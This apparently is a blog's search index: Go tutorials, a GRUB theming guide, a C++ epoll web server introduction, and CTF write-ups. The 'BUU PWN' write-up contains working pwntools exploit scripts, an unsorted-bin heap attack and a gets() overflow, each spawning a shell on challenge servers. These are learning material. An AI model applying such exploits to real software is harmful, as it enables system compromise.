语言的递归函数实现斐波那契数列：\npackage mainimport &quot;fmt&quot;func fibonacci(n int) int &#123;  if n &lt; 2 &#123;   return n  &#125;  return fibonacci(n-2) + fibonacci(n-1)&#125;func main() &#123;    var i int    for i = 0; i &lt; 10; i++ &#123;       fmt.Printf(&quot;%d\\t&quot;, fibonacci(i))    &#125;&#125;\n\n以上实例执行输出结果为：\n0    1    1    2    3    5    8    13    21    34\n\n\n\n\n\n0x12 Go 语言类型转换类型转换用于将一种数据类型的变量转换为另外一种类型的变量。Go 语言类型转换基本格式如下：\ntype_name(expression)\n\ntype_name 为类型，expression 为表达式。\n实例以下实例中将整型转化为浮点型，并计算结果，将结果赋值给浮点型变量：\npackage mainimport &quot;fmt&quot;func main() &#123;   var sum int = 17   var count int = 5   var mean float32      mean = float32(sum)/float32(count)   fmt.Printf(&quot;mean 的值为: %f\\n&quot;,mean)&#125;\n\n以上实例执行输出结果为：\nmean 的值为: 3.400000\n\n\n\n\n\n0x13 Go 语言接口Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。\n实例1\n/* 定义接口 */type interface_name interface &#123;   method_name1 [return_type]   method_name2 [return_type]   method_name3 [return_type]   ...   method_namen [return_type]&#125;/* 定义结构体 */type struct_name struct &#123;   /* variables */&#125;/* 实现接口方法 */func (struct_name_variable struct_name) method_name1() [return_type] &#123;   /* 方法实现 */&#125;...func (struct_name_variable struct_name) method_namen() [return_type] &#123;   /* 方法实现*/&#125;\n\n实例2\npackage mainimport (    &quot;fmt&quot;)type Phone interface &#123;    call()&#125;type NokiaPhone struct &#123;&#125;func (nokiaPhone NokiaPhone) call() &#123;    fmt.Println(&quot;I am Nokia, I can call you!&quot;)&#125;type IPhone struct &#123;&#125;func (iPhone IPhone) call() &#123;    fmt.Println(&quot;I am iPhone, I can call you!&quot;)&#125;func main() &#123;    var phone Phone    phone = new(NokiaPhone)    phone.call()    phone = new(IPhone)    phone.call()&#125;\n\n在上面的例子中，我们定义了一个接口Phone，接口里面有一个方法call()。然后我们在main函数里面定义了一个Phone类型变量，并分别为之赋值为NokiaPhone和IPhone。然后调用call()方法，输出结果如下：\nI am Nokia, I can call you!I am iPhone, I can call you!\n\n\n\n0x14 Go 错误处理Go 语言通过内置的错误接口提供了非常简单的错误处理机制。\nerror类型是一个接口类型，这是它的定义：\ntype error interface &#123;    Error() string&#125;\n\n我们可以在编码中通过实现 error 接口类型来生成错误信息。\n函数通常在最后的返回值中返回错误信息。使用errors.New 可返回一个错误信息：\nfunc Sqrt(f float64) (float64, error) &#123;    if f &lt; 0 &#123;        return 0, errors.New(&quot;math: square root of negative number&quot;)    &#125;    // 实现&#125;\n\n在下面的例子中，我们在调用Sqrt的时候传递的一个负数，然后就得到了non-nil的error对象，将此对象与nil比较，结果为true，所以fmt.Println(fmt包在处理error时会调用Error方法)被调用，以输出错误，请看下面调用的示例代码：\nresult, err:= Sqrt(-1)if err != nil &#123;   fmt.Println(err)&#125;\n\n实例\npackage mainimport (    &quot;fmt&quot;)// 定义一个 DivideError 结构type DivideError struct &#123;    dividee int    divider int&#125;// 实现 `error` 接口func (de *DivideError) Error() string &#123;    strFormat := `    Cannot proceed, the divider is zero.    dividee: %d    divider: 0`    return fmt.Sprintf(strFormat, de.dividee)&#125;// 定义 `int` 类型除法运算的函数func Divide(varDividee int, varDivider int) (result int, errorMsg string) &#123;    if varDivider == 0 &#123;            dData := DivideError&#123;                    dividee: varDividee,                    divider: varDivider,            &#125;            errorMsg = dData.Error()            return    &#125; else &#123;            return varDividee / varDivider, &quot;&quot;    &#125;&#125;func main() &#123;    // 正常情况    if result, errorMsg := Divide(100, 10); errorMsg == &quot;&quot; &#123;            fmt.Println(&quot;100/10 = &quot;, result)    &#125;    // 当除数为零的时候会返回错误信息    if _, errorMsg := Divide(100, 0); errorMsg != &quot;&quot; &#123;            fmt.Println(&quot;errorMsg is: &quot;, errorMsg)    &#125;&#125;\n\n执行以上程序，输出结果为：\n100/10 =  10errorMsg is:      Cannot proceed, the divider is zero.    dividee: 100    divider: 0\n\n\n\n\n\nGo 并发Go 语言支持并发，我们只需要通过 go 关键字来开启 goroutine 即可。\ngoroutine 是轻量级线程，goroutine 的调度是由 Golang 运行时进行管理的。\ngoroutine 语法格式：\ngo 函数名( 参数列表 )\n\n例如：\ngo f(x, y, z)\n\n开启一个新的 goroutine:\nf(x, y, z)\n\nGo 允许使用 go 语句开启一个新的运行期线程， 即 goroutine，以一个不同的、新创建的 goroutine 来执行一个函数。 同一个程序中的所有 goroutine 共享同一个地址空间。\npackage mainimport (        &quot;fmt&quot;        &quot;time&quot;)func say(s string) &#123;        for i := 0; i &lt; 5; i++ &#123;                time.Sleep(100 * time.Millisecond)                fmt.Println(s)        &#125;&#125;func main() &#123;        go say(&quot;world&quot;)        say(&quot;hello&quot;)&#125;\n\n执行以上代码，你会看到输出的 hello 和 world 是没有固定先后顺序。因为它们是两个 goroutine 在执行：\nworldhellohelloworldworldhellohelloworldworldhello\n\n通道（channel）通道（channel）是用来传递数据的一个数据结构。\n通道可用于两个 goroutine 之间通过传递一个指定类型的值来同步运行和通讯。操作符 &lt;- 用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。\nch &lt;- v    // 把 v 发送到通道 chv := &lt;-ch  // 从 ch 接收数据           // 并把值赋给 v\n\n声明一个通道很简单，我们使用chan关键字即可，通道在使用前必须先创建：\nch := make(chan int)\n\n注意：默认情况下，通道是不带缓冲区的。发送端发送数据，同时必须有接收端相应的接收数据。\n以下实例通过两个 goroutine 来计算数字之和，在 goroutine 完成计算后，它会计算两个结果的和：\npackage mainimport &quot;fmt&quot;func sum(s []int, c chan int) &#123;        sum := 0        for _, v := range s &#123;                sum += v        &#125;        c &lt;- sum // 把 sum 发送到通道 c&#125;func main() &#123;        s := []int&#123;7, 2, 8, -9, 4, 0&#125;        c := make(chan int)        go sum(s[:len(s)/2], c)        go sum(s[len(s)/2:], c)        x, y := &lt;-c, &lt;-c // 从通道 c 中接收        fmt.Println(x, y, x+y)&#125;\n\n输出结果为：\n-5 17 12\n\n通道缓冲区通道可以设置缓冲区，通过 make 的第二个参数指定缓冲区大小：\nch := make(chan int, 100)\n\n带缓冲区的通道允许发送端的数据发送和接收端的数据获取处于异步状态，就是说发送端发送的数据可以放在缓冲区里面，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据。\n不过由于缓冲区的大小是有限的，所以还是必须有接收端来接收数据的，否则缓冲区一满，数据发送端就无法再发送数据了。\n注意：如果通道不带缓冲，发送方会阻塞直到接收方从通道中接收了值。如果通道带缓冲，发送方则会阻塞直到发送的值被拷贝到缓冲区内；如果缓冲区已满，则意味着需要等待直到某个接收方获取到一个值。接收方在有值可以接收之前会一直阻塞。\npackage mainimport &quot;fmt&quot;func main() &#123;    // 这里我们定义了一个可以存储整数类型的带缓冲通道        // 缓冲区大小为2        ch := make(chan int, 2)        // 因为 ch 是带缓冲的通道，我们可以同时发送两个数据        // 而不用立刻需要去同步读取数据        ch &lt;- 1        ch &lt;- 2        // 获取这两个数据        fmt.Println(&lt;-ch)        fmt.Println(&lt;-ch)&#125;\n\n执行输出结果为：\n12\n\nGo 遍历通道与关闭通道Go 通过 range 关键字来实现遍历读取到的数据，类似于与数组或切片。格式如下：\nv, ok := &lt;-ch\n\n如果通道接收不到数据后 ok 就为 false，这时通道就可以使用 close() 函数来关闭。\npackage mainimport (        &quot;fmt&quot;)func fibonacci(n int, c chan int) &#123;        x, y := 0, 1        for i := 0; i &lt; n; i++ &#123;                c &lt;- x                x, y = y, x+y        &#125;        close(c)&#125;func main() &#123;        c := make(chan int, 10)        go fibonacci(cap(c), c)        // range 函数遍历每个从通道接收到的数据，因为 c 在发送完 10 个        // 数据之后就关闭了通道，所以这里我们 range 函数在接收到 10 个数据        // 之后就结束了。如果上面的 c 通道不关闭，那么 range 函数就不        // 会结束，从而在接收第 11 个数据的时候就阻塞了。        for i := range c &#123;                fmt.Println(i)        &#125;&#125;\n\n执行输出结果为：\n0112358132134","categories":["language"],"tags":["go"]},{"title":"go语言面向对象","url":"/2021/03/30/dev/language/go/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","content":"Golang的面向对象如你所知，封装、继承、多态和抽象是面向对象编程的4个基本特征，本文描述Golang语言是如何实现这些特征的。\n1 Golang的面向对象类型Golang实现面向对象的两个关键类型是struct和interface，其中struct类似C++的普通类类型，interface则对应抽象类类型。与C++采用public&#x2F;protected&#x2F;private指示成员和方法的可见性不同，Golang采用大小写标识可见性，即大写字母开头的成员&#x2F;方法对外可见，小写开头的则属于类的私有成员，外部不可以直接访问。此外，Golang与C++在类类型的定义上还有一个重要区别，那就是Golang在struct内只需要声明类的成员变量，而不需要在类定义体内声明或定义所有的方法，方法定义都在struct之外完成。好了，我们开始正文。\n2 Golang的面向对象实现2.1 封装学生有姓名、年龄和专业等属性，于是我们定义一个Student类型如下：\ntype Student struct &#123;\tname  string\tage   int\tmajor string&#125;\n\n学生可以跟大家打招呼：\nfunc (s Student) SayHi() &#123;\tfmt.Printf(&quot;Hi, I am %s aged %d, and my major is %s\\n&quot;, s.name, s.age, s.major)&#125;\n\n在函数定义的func关键字后面加上我们定义的Student类型变量定义，这个函数就成为了Student的方法。类图表示如下：\n值得注意的是，在Golang内，除slice、map、channel和显示的指针类型属于引用类型外，其它类型都属于值类型，前者作为函数入参传递时，函数对参数的修改会影响调用对象，而后者作为入参时，函数体内会生成调用对象的拷贝，函数对入参的修改不会影响调用对象。因此，如果我们要给Student类定义一个“构造函数”，我们希望的是这个函数的入参可以被赋值到Student的成员内，则该“构造函数”应该使用指针类型对象定义：\nfunc (s *Student) Init(name string, age int, major string) &#123;\ts.name = name\ts.age = age\ts.major = major&#125;\n\n我们来测试一下：\ns := Student&#123;&#125;s.Init(&quot;pirlo&quot;, 21, &quot;cs&quot;)s.SayHi()\n\n输出结果：\n$ go run test_encapsulate.go Hi, I am pirlo aged 21, and my major is cs.\n\n我们定义的学生类型，属性都是私有的，方法都是公有的，还记得么，私有或公有都是通过属性或方法的首字母大小写决定的。那我们现在来试一下公有属性和私有方法吧。比如，我想让专业（major）这个属性成为公有属性：\ntype Student struct &#123;\tname  string\tage   int\tMajor string&#125;func main() &#123;\ts := Student&#123;&#125;\ts.Init(&quot;pirlo&quot;, 21, &quot;cs&quot;)\ts.SayHi()\ts.Major = &quot;finance&quot;\ts.SayHi()&#125;\n\n先调用构造函数设置专业为cs，再通过显示赋值的方式修改专业为finance：\n$ go run test_encapsulate.go Hi, I am pirlo aged 21, and my major is cs.Hi, I am pirlo aged 21, and my major is finance.\n\n但是如果我们试图修改私有属性：\ns.age &#x3D; 22编译器会告诉你：\n$ go run test_encapsulate.go \n\ncommand-line-arguments.&#x2F;test_encapsulate.go:15: s.age undefined (cannot refer to unexported field or method age)\n括号的注释说明了不能引用未导出&#x2F;未公开的属性或方法。\n小结一下，Golang通过struct定义类的属性，通过在func定义时传入类对象的方式定义类的方法，其中属性和方法的公有&#x2F;私有属性是通过首字母的大小写决定的。\n2.2 继承与C++、Java等完整支持面向对象的语言不同，Golang没有显式的继承，而是通过组合实现继承。我们先定义一个基类Person，提供姓名和年龄两个属性，以及SayHi一个方法（Init类似于构造函数）：\ntype Person struct &#123;\tname string\tage  int&#125;func (p *Person) Init(name string, age int) &#123;\tp.name = name\tp.age = age&#125;func (p Person) SayHi() &#123;\tfmt.Printf(&quot;Hi, I am %s, %d years old.\\n&quot;, p.name, p.age)&#125;然后，我们通过组合的方式继承这个基类，实现Employee子类：type Employee struct &#123;\tPerson\tcompany string&#125;func (e *Employee) Init(name string, age int, company string) &#123;\te.Person.Init(name, age)\te.company = company&#125;func (e Employee) Work() &#123;\tfmt.Printf(&quot;I&#x27;m working %s.\\n&quot;, e.company)&#125;\n\nEmployee组合了Person这个成员，除此之外它还拥有自己的成员company，即所属公司，雇员除了是一个Person之外，还需要工作，因此我们定义了Work这个方法。好了，我们再测试一下：\nfunc main() &#123;\tp := oo.Person&#123;&#125;\tp.Init(&quot;pirlo&quot;, 21)\tp.SayHi()\te := oo.Employee&#123;&#125;\te.Init(&quot;kaka&quot;, 22, &quot;milan&quot;)\te.SayHi()\te.Work()&#125;\n\n\n\n输出\n$ go run test_inherit.go Hi, I am pirlo, 21 years old.Hi, I am kaka, 22 years old.I&#x27;m working in milan.\n\n雇员kaka可以像pirlo一样说话，与此同时，他还可以在milan工作，类图表示如下：\n小结一下，Golang没有完整实现继承，而是通过组合的方式实现。组合类（子类）可以直接调用被组合类（基类）的公有方法，访问基类的公有属性，子类也可以定义自己的属性，以及实现自己特有的方法。Golang的设计哲学之一就是简洁，通过大小写区分成员&#x2F;方法的公有&#x2F;私有属性，通过组合的方式实现继承，都是简洁哲学的体现。\n2.3 抽象抽象的反义词是具体，在面向对象编程中，抽象的意思是将共同的属性和方法抽象出来形成一个不可以被实例化的类型，在Java里面，这是通过abstract和interface实现的，其中前者可以包含属性，后者则是纯粹的方法集合；C++通过在类内定义纯虚函数使得该类成为一个抽象类。Golang的interface类型定义的也是一个抽象的基类，它是一组方法的集合，任何完整实现这些方法的类型都被称为该接口的实现。由于抽象与多态是相辅相成的，或者说抽象的目的就是为了实现多态，我们将在下一节给出实例说明Golang的抽象和多态的实现。\n2.4 多态基类指针可以指向任意派生类的对象，并在运行时绑定最终调用的方法的过程被称为多态。多态是运行时特性，而继承则是编译时特征，也就是说，继承关系在编译时就已经确定了，而多态则可以实现运行时的动态绑定。小狗和小鸟都是动物，它们都会移动，也都会叫唤。我们把它们共同的方法提炼出来定义一个抽象的接口：\ntype Animal interface &#123;\tMove()\tShout()&#125;虽然小狗和小鸟都会移动，但小狗是用四条腿爬行，小鸟是用翅膀飞行，虽然它们都会叫唤，但是叫唤的方式也不一样：type Dog struct &#123;&#125;func (dog Dog) Move() &#123;\tfmt.Println(&quot;A dog moves with its legs.&quot;)&#125;func (dog Dog) Shout() &#123;\tfmt.Println(&quot;wang wang wang.&quot;)&#125;type Bird struct &#123;&#125;func (bird Bird) Move() &#123;\tfmt.Println(&quot;A bird flys with its wings.&quot;)&#125;func (bird Bird) Shout() &#123;\tfmt.Println(&quot;A bird shouts.&quot;)&#125;\n\n\n\n那么，运行时的多态是怎么实现的呢？\nfunc main() &#123;\tvar animal oo.Animal\tanimal = oo.Dog&#123;&#125;\tanimal.Move()\tanimal.Shout()\tanimal = oo.Bird&#123;&#125;\tanimal.Move()\tanimal.Shout()&#125;\n\n如前文所述，基类指针可以指向任意派生类的对象，并在运行时动态绑定最终使用的方法。这里指针是广义上的概念，在C++中是真实的指针，在Java和Golang里面，则可以是一个接口类型的对象。在上面的代码中，我们定义了一个Animal类型的对象，并分别指向Dog和Bird类型的具体对象，并调用Move和Shout方法，它们的运行效果如下：\n$ go run test_polymorphism.go A dog moves with its legs.wang wang wang.A bird flys with its wings.A bird shouts.\n\n\n\n\n\n","categories":["language"],"tags":["go"]},{"title":"我的好朋友","url":"/2021/03/28/life/love/angry/","content":"\n  69d01b89b9601e5c57b37cfc1411681a62b39706ef236a22276c214d08fb7bfe4698941c2fa0882ab68260cde5fde3f8666e67073395950e76ff82e3f94b0f5c516d1ccbb9d55216a970672f233e47e59031132cd9052ed36d7e7a1af09a05ea41b6b03eb6e2cfb80951e2737f39b2e6381a6a4ff2539a67b5b9f26488b58b03e15d54269542ea15a092166056649ad93209d01f2c97eecf1ad1b40aee46ce5eafd03edb6326fbe20fe8e386034a7f0e7384b071a538baf14a0fa4c7707aa406\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","tags":["life"]},{"title":"更换grub主题","url":"/2021/03/26/env/linux/myarch/grub_theme/","content":"更换grub主题下载主题可以到 gnome-look 选择喜欢的主题下载\nhttps://www.gnome-look.org/browse/\n解压缩主题包sudo tar -xf [主题包名] \n\n复制到主题目录sudo cp -r [主题包名] /boot/grub/themes/  \n\n修改配置文件sudo vim /etc/grub.d/00_header\n\n添加如下内容GRUB_THEME=&quot;/boot/grub/themes/主题包名/theme.txt&quot;GRUB_GFXMODE=&quot;1920x1200x32&quot;\n\nGRUB_THEME : 是主题路径\nGRUB_GFXMODE: 是分辨率\n更新配置文件sudo grub-mkconfig -o /boot/grub/grub.cfg\n\n\n如果是 debian 系可直接使用sudo update-grub.\n","categories":["env"],"tags":["linux"]},{"title":"BUU PWN","url":"/2021/03/26/security/ctf/buu/buu-pwn/","content":"BUU PWNhitcontraining_magicheap只需使\nif ( v3 == 4869 )    &#123;      if ( (unsigned __int64)magic &lt;= 0x1305 )      &#123;        puts(&quot;So sad !&quot;);      &#125;      else      &#123;        puts(&quot;Congrt !&quot;);        l33t();      &#125;    &#125;\n\n magic &gt; 0x1305即可，然而采用unsorted bin attack可以实现。\nunsorted bin attack知识回顾poc\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123;    char *ptr = NULL, *controllable_chunk, *trigger;    controllable_chunk = malloc(400);    malloc(10); // 防止与top chunk合并    free(controllable_chunk);    // controllable_chunk-&gt;bk = target - size_t*2    ((void **)controllable_chunk)[1] = &amp;ptr - 2;    // 注意，这里要和free的size相同，否则会引发异常    trigger = malloc(400);    fprintf(stderr, &quot;ptr: %p\\n &quot;, ptr);    return 0;&#125;\n\nref: http://blog.eonew.cn/archives/623\nexp#! /usr/bin/pythonfrom pwn import *#io = process(&#x27;./magicheap&#x27;)io = remote(&#x27;node3.buuoj.cn&#x27;, 28961)def add(sz, d):    io.sendlineafter(&#x27;:&#x27;, &#x27;1&#x27;)    io.sendlineafter(&#x27;:&#x27;, str(sz))    io.sendafter(&#x27;:&#x27;, d)    def rm(idx):    io.sendlineafter(&#x27;:&#x27;, &#x27;3&#x27;)    io.sendlineafter(&#x27;:&#x27;, str(idx))def edit(idx, sz, d):    io.sendlineafter(&#x27;:&#x27;, &#x27;2&#x27;)    io.sendlineafter(&#x27;:&#x27;, str(idx))    io.sendlineafter(&#x27;:&#x27;, str(sz))    io.sendafter(&#x27;:&#x27;, d)    add(0x80, &#x27;A&#x27;)add(0x400, &#x27;B&#x27;)add(0x80, &#x27;C&#x27;)rm(1)p =  b&#x27;\\x00&#x27; * 0x80p += p64(0) + p64(0x411)p += p64(0) + p64(0x6020A0 - 0x10)edit(0, len(p), p)# unsorted bin attackadd(0x400, &#x27;B&#x27;)#gdb.attach(io)# get shellio.sendlineafter(&#x27;:&#x27;, &#x27;4869&#x27;)io.interactive()\n\nflag{02e8c026-509a-4dcc-bbdd-47272f8f63bb}\nmrctf2020_easyoverflowmain\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[48]; // [rsp+0h] [rbp-70h] BYREF  char v5[24]; // [rsp+30h] [rbp-40h] BYREF  __int64 v6; // [rsp+48h] [rbp-28h]  __int64 v7; // [rsp+50h] [rbp-20h]  __int64 v8; // [rsp+58h] [rbp-18h]  __int16 v9; // [rsp+60h] [rbp-10h]  unsigned __int64 v10; // [rsp+68h] [rbp-8h]  v10 = __readfsqword(0x28u);  strcpy(v5, &quot;ju3t_@_f@k3_f1@g&quot;);  v6 = 0LL;  v7 = 0LL;  v8 = 0LL;  v9 = 0;  gets(v4, argv);  if ( !(unsigned int)check((__int64)v5) )    exit(0);  system(&quot;/bin/sh&quot;);  return 0;&#125;\n\ncheck\n__int64 __fastcall check(__int64 a1)&#123;  int i; // [rsp+18h] [rbp-8h]  int v3; // [rsp+1Ch] [rbp-4h]  v3 = strlen(fake_flag);  for ( i = 0; ; ++i )  &#123;    if ( i == v3 )      return 1LL;    if ( *(_BYTE *)(i + a1) != fake_flag[i] )      break;  &#125;  return 0LL;&#125;\n\ngets存在漏洞，然而v5与fake_flag字符串不同，只需使v5字符串为fake_flag即可，也就是赋值为‘n0t_r3@11y_f1@g\\x00’\nexp#! /usr/bin/pythonfrom pwn import *#io = process(&#x27;./mrctf2020_easyoverflow&#x27;)io = remote(&#x27;node3.buuoj.cn&#x27;, 27093)p = b&#x27;A&#x27; * 48p += b&#x27;n0t_r3@11y_f1@g\\x00&#x27;io.sendline(p)io.interactive()\n\nflag{fd1881f7-e080-4481-b01f-f2e27c15502c}\n更新中…\n","categories":["ctf"],"tags":["pwn"]},{"title":"BUU CRYPTO","url":"/2021/03/26/security/ctf/buu/buu-crypto/","content":"BUU CRYPTORSA在一次RSA密钥对生成中，假设p&#x3D;473398607161，q&#x3D;4511491，e&#x3D;17求解出d作为flga提交\nEXPimport libnump = 473398607161q = 4511491e = 17d = libnum.invmod(e, (p - 1) * (q - 1))print(d)\n\nflag{125631357777427553}\nRSA1p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852\nEXPimport libnumimport mathp = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852i = libnum.invmod(q, p)mp = pow(c, dp, p)mq = pow(c, dq, q)m = (((mp - mq) * i) % p) * q + mqprint(hex(m))s = hex(m)[2:]flag = &#x27;&#x27;i = 0for _ in range(int(len(s) / 2)):    n  = int(s[i + 0], 16) * 0x10    n += int(s[i + 1], 16)    flag += chr(n)    i += 2    print(flag)\n\nflag{W31c0m3_70_Ch1n470wn}\n丢失的md5题目给了md5.py\nimport hashlib   for i in range(32,127):    for j in range(32,127):        for k in range(32,127):            m=hashlib.md5()            m.update(&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27;)            des=m.hexdigest()            if &#x27;e9032&#x27; in des and &#x27;da&#x27; in des and &#x27;911513&#x27; in des:                print(des)\n\n运行结果就是flag\nrsarsaMath is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.\np &#x3D;  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q &#x3D;  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e &#x3D;  65537c &#x3D;  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034\nUse RSA to find the secret message\nEXPimport libnump =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e =  65537c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034#d = libnum.invmod(e, (p - 1) * (q - 1))m = pow(c, d, p * q)print(m)\n\nflag{5577446633554466577768879988}\n更新中…\n","categories":["ctf"],"tags":["crypto"]},{"title":"LGX SERVER FRAMEWORK INTRO","url":"/2021/03/25/dev/game/server/lgx-server/","content":"LGX SERVER FRAMEWORK INTROIntro这是我写的开源web 服务器，lgx服务器是一个高性能的静态web服务器，由c++语言编写。如果您想处理http的post或get方法，可以使用c++语言开发自己的服务器，只需开发src&#x2F;work&#x2F;工时.hh&#x2F;cc.\ngithub: https://github.com/pwnsky/lgx\nModule Basic该服务主要分为了5个模块，5个模块相互依赖，分别是\nnet — 实现接受客户端请求的网络模块\nthread — 对线程常用接口进行了c++封装\nutil — 常用其他工具块\nwork — 客户端请求后处理模块\nlog — 日志模块\nImportant Class Introstart_up: 启动模块类，用于启动各个模块。\nnet::net: 用于启动网络模块，网络模块各种机制的入口。\nnet::epoll: 对epoll常用函数进行一个封装，当然，该epoll提供储存epoll事件，还有channel类，便于查找触发的事件。\nnet::channel: 与epoll事件嵌套的一个基本事件类，负责epoll事件触发时实现回调功能\nnet::eventloop: 事件循环器，单独一个线程就创建这么个eventloop，方便各种事件实现储存化，过程化执行等。\nnet::http: 与channel绑定，主要用于解析http和包裹数据为http。\nnet::timer: 实现一个http类的计时器。\nnet::timer_manager: 计时器管理器，用于销毁超时的计时器，超时后，会销毁net::timer，当然就会销毁http对象了。\nnet::eventloop_thread: 用于创建一个eventloop线程。\n net::eventloop_threadpool: 用于管理创建出来的net::eventloop_thread。\nEpoll Intro在了解框架之前，我们先来了解一下epoll的一些基础知识。epoll模型是目前比较优秀的IO多路复用模型，首先，epoll没有最大并发连接的限制，上限是整个系统最大可以打开的socket FD数目，一般这个数目和系统内存关系很大，1G内存的机器的最大sockef FD数目可以达到10万左右。其次，epoll最大的优点在于它只关心活跃的连接，而跟连接总数无关。因此在实际的网络环境中，epoll的效率会远高于select和poll。鉴于epoll的优点，我们的服务器采用了epoll作为IO多路复用的基本技术。常见的基于epoll的设计模式主要为单线程的事件循环，用于一些非阻塞的业务逻辑开发是很高效的，然而，在服务器开发中，涉及传输数据。转发请求的需求，耗时比较长。因此，单线程的epoll并不能满足我们的需要。下面用一个简单的例子来说明单线程模式下epoll的缺点。\n\n由于是单线程模型，当某个客户端的请求处理时间较长时，会影响服务器接收来自其他客户端的连接请求，进而影响整个服务器的并发性能。\n　　因此，单线程的epoll模型在我们的分布式服务器中并不适用。下面是我们服务器的设计方案:\n　　     \n　　　　　　　　　　　　    图2　　　　　　　　　　　　　　　　　　　　　　　　　　　　　  图3\n　　上面这种设计模式一般称为Reactor模式，Reactor模式是处理并发I&#x2F;O比较常见的一种模式，中心思想是首先将所有要处理的I&#x2F;O事件添加到一个中心的多路复用器上(epoll)， 同时主线程阻塞在多路复用器上；一旦有连接到来或者是准备就绪，多路复用器将返回并将相应的I&#x2F;O事件分发到对应的处理线程中。\n　　我们的服务器采用了多个Reactor，也就是多线程的epoll。 Reactor被分为main reactor和sub reactors，分别对应图2 和图3。每个reactor中都有独立的epoll来作为多路复用器。其中main reactor中的epoll负责监听连接请求，一旦有连接到来，利用一定的分发策略将连接socket加入到sub reactors的epoll中。对于每个sub reactor的epoll，主要的工作就是监听连接socket，一旦某个连接socket的I&#x2F;O准备就绪，则通知相应的handler来接收数据并处理请求。\n　　通过使用非阻塞I&#x2F;O的多路复用技术epoll，并将连接请求与连接建立的之后的逻辑分离，我们设计了基于Reactor设计模式的服务器，满足了高并发的处理数据查询请求与数据传输请求。并能够同时处理长连接与短连接。 同时，还有一些细节我们可以改进：\n\nMain reactor 到sub reactors的分发策略\n\n　　目前我们采用了Round-robin的方式，这样有可能产生负载不均衡的现象。 后面我们可以使用一定的策略，将main reactor接收到的连接请求分发到相对空闲的sub\n　　reactor中。保证整个系统的负载均衡。\n\nsub reactor的多线程化\n\n　　对于每个sub reactor来说，这是单线程的。 我们同样可以将sub reactor进一步划分， 将数据的接收与请求的处理分离，请求的处理采用线程池的方式。这将进一步提高服务器的并发能力。\nThread Intro线程模块做了c语言接口的封装，提供同步锁的机制和同步condtion机制，方便各个线程之间实现同步。\nLog Intro采异步方式进行文件写入。\nStart Process这里来介绍一下lgx server的启动流程。\n在main函数总进行startup.run()函数之后，首先是加载配置文件，开启初始化各个模块功能，比如安全模块，日志模块等，最后一个是启动网络模块，网络模块才是服务器的核心，接下来会详细讨论各个模块。加载配置文件采用nlohmann::json库来进行解析json格式的配置文件。将配置文件数据进行解析，配置文件一般包含，监听端口，日志目录，web根目录，index文件，还有被禁的ip。安全模块会加载配置文件中的禁止的ip，避免该ip与服务建立连接。日志模块是单独开启一个线程来异步处理写入日志。接下来就是启动网络模块了，网络模块只需传入监听端口和线程数，最复杂的也就是网络模块了，大家不必担心，我带大家进入这个有趣的世界。\n创建net类的时候，会对主线程new 出一个eventloop，启动的话就是调用eventloop::loop()了。那么什么是eventloop？eventloop是一个事件循环器，包含了写好的一些回调函数，把事件实现储存化，过程化，单一线程逐一处理不同事件，在没有事件发生时，该线程会阻塞，直到有事件要处理为止。好了，在创建net类设置好初始化的一些值后，关键启动在net::start函数里，对端口进行绑定和监听，忽略一个isgpipe信号，避免服务器异常退出，再设置监听的套接字为非阻塞模式，也即使后面我们要介绍的EPOLL 